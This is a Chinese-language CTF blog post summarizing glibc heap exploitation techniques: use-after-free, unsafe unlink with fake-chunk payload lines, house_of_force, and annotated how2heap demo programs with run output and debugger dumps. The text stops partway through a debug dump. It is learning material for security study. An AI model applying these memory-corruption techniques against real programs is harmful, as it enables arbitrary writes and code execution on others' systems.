<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/image3.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="zs0zrc&#39;s blog">
  <meta name="author" content="zs0zrc">
  <meta name="keywords" content="pwn CTF security anythings">
  <title>堆利用的一些总结 - zs0zrc</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/image1.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期五, 三月 8日 2019, 11:11 上午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    10.5k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      55 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p class="note note-warning">本文最后更新于：星期三, 四月 17日 2019, 9:01 上午</p>
            
            <div class="markdown-body">
              <p>最近闲来无事，就把学过的堆的利用总结一下。这里只是总结一下利用的思路，基础知识就不讲了，可能会贴上些glibc的源码。</p>
<h3 id="一些学习网站"><a href="#一些学习网站" class="headerlink" title="一些学习网站"></a>一些学习网站</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/introduction/" target="_blank" rel="noopener">CTF-WIKI</a>入门网站</p>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html" target="_blank" rel="noopener">CTF-ALL-IN-ONE</a>对堆的利用的原理讲的很清楚</p>
<p><a href="https://heap-exploitation.dhavalkapil.com/" target="_blank" rel="noopener"> Heap Exploitation</a>国外作者写的，感觉还行</p>
<p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener">source code of malloc.c</a>在线阅读glibc的源码，很方便</p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>UAF也就是use after free，这种情况的产生是因为free掉了chunk后没有将它的指针置为空。所以在被free掉后还可以被使用。</p>
<p>用处：</p>
<ol>
<li>泄露信息，比如说泄露libc的地址</li>
<li>与fastbins attack结合，分配到包含想要控制的地址的chunk</li>
<li>进行unsortedbin attack，向一个地址内写入一个很大的值</li>
</ol>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>unlink的目的：把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。这实际上是对chunk的fd和bk指针的操作，fd_nextsize和bk_nextsize只有在chunk是large bins chunk时才会用到，而一般情况下很少用到。</p>
<p>unlink攻击的前提条件： 程序必须有某个地方存储着malloc返回的chunk地址，例如bss段中存放chunk地址的全局数组变量</p>
<p>unsafe_unlink攻击的本质，是对fd和bk这两个指针的利用</p>
<pre><code class="c">FD = P-&gt;fd;                                                                     
BK = P-&gt;bk; 
FD-&gt;bk = BK;                                   
BK-&gt;fd = FD; 
因为unlink会有一个check,检查chunk的fd和bk是否被恶意修改了，所以为了绕过检查
FD和BK只能修改成特定的值，假设ptr上存储着P的地址
 (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))
64位下
FD = ptr - 0x18
BK  = ptr- 0x10
unlink实际做了
*(ptr - 0x18 + 0x18) = ptr - 0x10
*(ptr - 0x10 - 0x10) = ptr - 0x18 #主要看这步
等价于
*ptr = ptr - 0x18
</code></pre>
<p>通过unlink攻击可以控制 并修改指向chunk的指针，如果程序有往chunk中写的操作，那么就可以借此实现任意地址写</p>
<p>PWN中的unlink 攻击主要分两种：</p>
<ul>
<li>向前合并的unlink(这里的前是指高地址的chunk)</li>
<li>向后合并的unlink(这里的后是指低地址的chunk)<br>这两者要构造的chunk有点不一样<br>下面一律假设 free掉的chunk为P，存储着P地址的地址 为ptr</li>
</ul>
<ol>
<li>向后合并<br>源码：<pre><code class="c">if (!prev_inuse(p)) {
   prevsize = prev_size (p);
   size += prevsize;
   p = chunk_at_offset(p, -((long) prevsize));
   unlink(av, p, bck, fwd);
 }
</code></pre>
</li>
</ol>
<ul>
<li><p>根据P的size字段的flag位，判断前一个chunk是否正在使用</p>
</li>
<li><p>如果前一个chunk是free状态，修改size大小</p>
</li>
<li><p>修改指向P的指针，改为指向前一个chunk</p>
</li>
<li><p>利用unlink将前一个chunk从bins链表中移除<br>这里构造的话要在前一个chunk中伪造一个fake_chunk,fake_chunk的fd和bk指针要为特定值，</p>
<p>同时通过存在的漏洞控制当前chunk的prev_size字段和size字段，使其prev_size的大小的</p>
<p>fake_chunk的大小，size字段中的prev_inuse标志位为0<br>构造的payload</p>
</li>
</ul>
<pre><code class="c">//假设 前一个chunk的大小为0xa0, P的大小为0x90
64位的
fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) 
fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;)
32位的
fake_chunk = p32(0) + p32(0x90) + p32(ptr- 0x10) + p32(ptr - 0x8)
fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;)
同时要修改P的prev_size为 0x90，size字段为0x90，使prev_inuse为0
最后free掉P就可以触发unlink了
</code></pre>
<p>2.向前合并<br>源码：</p>
<pre><code class="c"> if (nextchunk != av-&gt;top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);/*这里检查下下个chunk的flag标志位*/
      /* consolidate forward */
      if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
      }

#define inuse_bit_at_offset(p, s)\
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)
</code></pre>
<ul>
<li>检查下下个chunk的prev_inuse标志位</li>
<li>如果prev_inuse为0，就进行unlink，将P从链表中取出</li>
<li>然后修改P的size字段<br>这里利用要构造的chunk和向后合并不一样，它要能控制P的下下个chunk的size字段<br><img src="https://upload-images.jianshu.io/upload_images/8390991-60c12afffea573fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></li>
</ul>
<p>上面的图是一个64位的简单的例子，chunk1已经设置好了fd和bk，此时只要free掉chunk0，就会检查是否可以向前合并，通过检查chunk0的下下个chunk的prev_inuse标志位，也就是chunk2的，这里chunk2的prev_ inuse已经被我设置为0了，这时就会进行向前合并，通过unlink宏将chunk1从链表中取出来。</p>
<p>大致的就是上面所说的，不过实际上会复杂很多。<br>下面贴上unlink源码<br>unlink源码：</p>
<pre><code class="c">#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))    /*检查chunk的size字段*/
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                              
    FD = P-&gt;fd;                                                                     
    BK = P-&gt;bk;                                                                    
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))/*检查chunk的fd 和bk是否正确，这里也是unlink要绕过的地方*/                     
      malloc_printerr (&quot;corrupted double-linked list&quot;);                             
    else {                                                                   
        FD-&gt;bk = BK;                                   
        BK-&gt;fd = FD;                                                            
        if (!in_smallbin_range (chunksize_nomask (P))                             
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {                     
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)             
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))   
              malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);  
            if (FD-&gt;fd_nextsize == NULL) {                                      
                if (P-&gt;fd_nextsize == P)                                     
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                    
                else {                                                             
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                             
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                             
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                            
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                             
                  }                                                             
              } else {                                                             
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                    
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                  
              }                                                                  
          }                                                                    
      }                                                                        
}
</code></pre>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>topchunk简单的玩法就是house_of_force，分配出包含想要控制的地址的chunk，一般来说用来修改got表的内容，或者是修改_malloc_hook或者free_hook的内容。还有一种玩法就是往特定的地址写入特定的值，这个和topchunk的分配机制有关。</p>
<p>详情参考我这篇<a href="https://zszcr.github.io/heap_exploitation/2018/09/15/topchunk%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">博客</a></p>
<hr>
<h3 id="how2heap系列"><a href="#how2heap系列" class="headerlink" title="how2heap系列"></a>how2heap系列</h3><p><strong>—————————–2019.3.8更新</strong></p>
<p>最近在整理自己的知识体系，读了一下malloc的源码，顺便看了下how2heap上的利用例子。在这篇堆总结中记录一下。建议学习how2heap系列时，可以编译带调试信息的可执行文件，这样比较方便调试。其中一些的源码，我删除了一些没用的输出，精简了一下。</p>
<h4 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);

    fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);
    fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);
    fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);

    fprintf(stderr, &quot;Freeing the first one...\n&quot;);
    free(a);

    fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);
    // free(a);

    fprintf(stderr, &quot;So, instead, we&#39;ll free %p.\n&quot;, b);
    free(b);

    fprintf(stderr, &quot;Now, we can free %p again, since it&#39;s not the head of the free list.\n&quot;, a);
    free(a);

    fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#39;ll get %p twice!\n&quot;, a, b, a, a);
    fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));
    fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));
    fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));
}
</code></pre>
<p>这个例子主要是展示了fastbin的Double free，这个指的是fastbin中chunk可以被free多次，所以可以在fastbin链表中存在多次。导致了多次分配可以从fastbin中取出同一块chunk。</p>
<p>这个能成功的原因：</p>
<ol>
<li>放入fastbins中的chunk对应的nextChunk 的prev_inuse标志位没有清空</li>
<li>fastbin在执行free时只验证了fasttop的chunk，对后面的chunk没有进行检查</li>
</ol>
<p>运行结果</p>
<pre><code>☁  how2heap [master] ⚡  ./fastbin_dup 
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xc01010
2nd malloc(8): 0xc01030
3rd malloc(8): 0xc01050
Freeing the first one...
If we free 0xc01010 again, things will crash because 0xc01010 is at the top of the free list.
So, instead, we&#39;ll free 0xc01030.
Now, we can free 0xc01010 again, since it&#39;s not the head of the free list.
Now the free list has [ 0xc01010, 0xc01030, 0xc01010 ]. If we malloc 3 times, we&#39;ll get 0xc01010 twice!
1st malloc(8): 0xc01010
2nd malloc(8): 0xc01030
3rd malloc(8): 0xc01010
</code></pre><h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);
  fprintf(stderr, &quot;Now free p1!\n&quot;);
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);
  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);
  free(p1);
  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);
  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);
  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));
}
</code></pre>
<p>这个主要是展示了一下利用malloc_consolidate函数来进行Double free。</p>
<p>当在fastbin 中不存在满足分配需求的chunk时，会执行malloc_consolidate函数，这个函数主要的功能是将fastbin中的chunk拿出来，检查它们物理相邻的chunk是否处于free状态，如果处于就合并，然后将合并后的chunk放入unsortedbin中，如果是与topchunk相邻，就直接和top_chunk合并。</p>
<p>运行结果:</p>
<pre><code>☁  glibc_2.25 [master] ⚡  ./fastbin_dup_consolidate 
Allocated two fastbins: p1=0x993010 p2=0x993060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x9930b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x993010 0x993010
</code></pre><p>简单分析下流程</p>
<p>先分配两个大小为0x40的chunkp1、p2，然后将p1 free掉， p1会被放入fastbins中</p>
<pre><code>pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x602000 --&gt; 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6020a0 (size : 0x20f60) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
</code></pre><p>然后分配一个0x400大小的chunk，这时没有满足这个大小的chunk，所以会执行malloc_consolidate函数，将fastbin中的chunk 合并（这里是指和物理相邻的并且处于free状态的chunk合并），然后再放入unsorted bin中</p>
<p>，所以p1会从fastbin中转移到unsortedbin中。然后分配器再检查bins中是否有符合的chunk，如果没有，就将unsortedbin中的chunk放入对应的bin中，这里p1被放入了smallbin[0x50]</p>
<pre><code>pwndbg&gt; smallbins 
smallbins
0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8
</code></pre><p>然后再free掉p1就不会触发doublefree 了，因为这时p1不在fastbin的头部。最后连续分配两次0x40大小的chunk，就可以取出两次p1。</p>
<h4 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    unsigned long long stack_var;

    fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);

    fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);
    fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);
    fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);

    fprintf(stderr, &quot;Start double free a\n&quot;);

    free(a);//double free a
    free(b);
    free(a);

    unsigned long long *d = malloc(8);

    fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);
    fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));
    fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);
    fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;
        &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;
        &quot;so that malloc will think there is a free chunk there and agree to\n&quot;
        &quot;return a pointer to it.\n&quot;, a);
    stack_var = 0x20;//set size

    fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);
    *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));

    fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));
    fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));
}
</code></pre>
<p>这个例子展示了怎么利用fastbin的Double free来分配得到位于stack的chunk。核心是控制fasbtin chunk的fd指针，将它指向stack，同时stack上要有满足大小的size值。实际上可以利用这实现分配任意地址，只要知道地址，并且地址上存在满足相应fastbin大小的size值。</p>
<p>先Double free </p>
<pre><code>pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre><p>修改fastbins chunk的fd指针为stack_add，那么fastbins链表就会指向stack_chunk</p>
<pre><code>pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 —▸ 0x7fffffffdd08 —▸ 0x602010 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre><p>最后分配到stack的内存</p>
<pre><code>☁  glibc_2.25 [master] ⚡  ./fastbin_dup_into_stack 
The address we want malloc() to return is 0x7ffe3a30b948.
Allocating 3 buffers.
1st malloc(8): 0x8ef010
2nd malloc(8): 0x8ef030
3rd malloc(8): 0x8ef050
Start double free a
1st malloc(8): 0x8ef010
2nd malloc(8): 0x8ef030
Now the free list has [ 0x8ef010 ].
Now, we have access to 0x8ef010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x8ef010 to point right before the 0x20.
3rd malloc(8): 0x8ef010, putting the stack address on the free list
4th malloc(8): 0x7ffe3a30b948
</code></pre><h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{

    fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;);
    malloc(1);

    fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.\n&quot;);
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);

    fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);
    fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);
    fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);
    a = &amp;fake_chunks[2];

    fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);
    free(a);

    fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);
    fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30));
}
</code></pre>
<p>这个技术核心是在目标地址伪造fake_chunk，然后将释放。最终可以实现分配指定地址的目的。要注意的是要伪造fake_chunk的nextchunk，使其size字段的prev_inuse为0x1。</p>
<p>其中伪造的fake_chunk要满足一些条件</p>
<ol>
<li>fake_chunk的地址需要对齐</li>
<li>fake_chunk的IS_MMAPPED位不能置为1，不然在被free时会被当作mmap的chunk处理</li>
<li>fake_chunk的size大小要满足对应的fastbin的大小</li>
<li>fake_chunk的next_chunk大小要大于2*SIZE_SZ，同时小于av-&gt;system_mem (128kb)</li>
</ol>
<p>查看伪造的fake_chunk以及 next_chunk</p>
<pre><code>pwndbg&gt; p fake_chunks 
$4 = {0x0, 0x40, 0xff0000000000, 0x0, 0x1, 0x4008cd, 0x0, 0x0, 0x400880, 0x1234}
pwndbg&gt; p &amp;fake_chunks 
$3 = (unsigned long long (*)[10]) 0x7fffffffdcf0
pwndbg&gt; chunkinfo 0x7fffffffdcf0
==================================
            Chunk info            
==================================
Status :  Freed 
Unlinkable : False (FD or BK is corruption)  
Freeable : True
prev_size : 0x0                  
size : 0x40                  
prev_inused : 0                    
is_mmap : 0                    
non_mainarea : 0                     
fd : 0xff0000000000                  
bk : 0x0    

</code></pre><p>运行结果</p>
<pre><code>☁  glibc_2.25 [master] ⚡  ./house_of_spirit 
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffc6d557388 and the second at 0x7ffc6d5573c8.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffc6d557388.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc6d557388, which will be 0x7ffc6d557390!
malloc(0x30): 0x7ffc6d557390
</code></pre><h4 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h4><p>源码</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

int main(int argc , char* argv[]){

    intptr_t *p1,*p2,*p3,*p4;

    fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem\n\n&quot;);
    fprintf(stderr, &quot;Let&#39;s start to allocate 3 chunks on the heap\n&quot;);

    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x80 - 8);

    fprintf(stderr, &quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;, p1, p2, p3);

    memset(p1, &#39;1&#39;, 0x100 - 8);
    memset(p2, &#39;2&#39;, 0x100 - 8);
    memset(p3, &#39;3&#39;, 0x80 - 8);

    free(p2);

    int evil_chunk_size = 0x181;
    int evil_region_size = 0x180 - 8;

    *(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2

    p4 = malloc(evil_region_size);

    fprintf(stderr, &quot;\np4 has been allocated at %p and ends at %p\n&quot;, (char *)p4, (char *)p4+evil_region_size);

    fprintf(stderr, &quot;Let&#39;s run through an example. Right now, we have:\n&quot;);
    fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
    fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);

    fprintf(stderr, &quot;\nIf we memset(p4, &#39;4&#39;, %d), we have:\n&quot;, evil_region_size);
    memset(p4, &#39;4&#39;, evil_region_size);
    fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
    fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);

    fprintf(stderr, &quot;\nAnd if we then memset(p3, &#39;3&#39;, 80), we have:\n&quot;);
    memset(p3, &#39;3&#39;, 80);
    fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
    fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);
}
</code></pre>
<p>这个是一个简单的overlapping_chunk的例子，它通过修改被free掉的chunk_p2的size字段，使其增大，大小为p2_size + p3_size 。然后再malloc 相应大小的chunk_p4，就可以通过chunk_p4控制 chunk_p3的内容。这个 evil_chunk_size需要注意下它的标志位，尽量保持堆的稳定性。</p>
<p>调试一下：</p>
<p>修改size前</p>
<pre><code>pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x603280 (size : 0x20d80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x603100 (size : 0x100)
pwndbg&gt; chunkinfo 0x603100
==================================
            Chunk info            
==================================
Status :  Freed 
Unlinkable : True
Result of unlink :
       FD-&gt;bk (*0x7ffff7dd1b90) = BK (0x603100 -&gt; 0x7ffff7dd1b78) 
       BK-&gt;fd (*0x7ffff7dd1b88) = FD (0x603100 -&gt; 0x7ffff7dd1b78) 
Freeable : false -&gt; Double free chunkaddr(0x603100) inused bit is not seted )
prev_size : 0x3131313131313131                  
size : 0x100                  
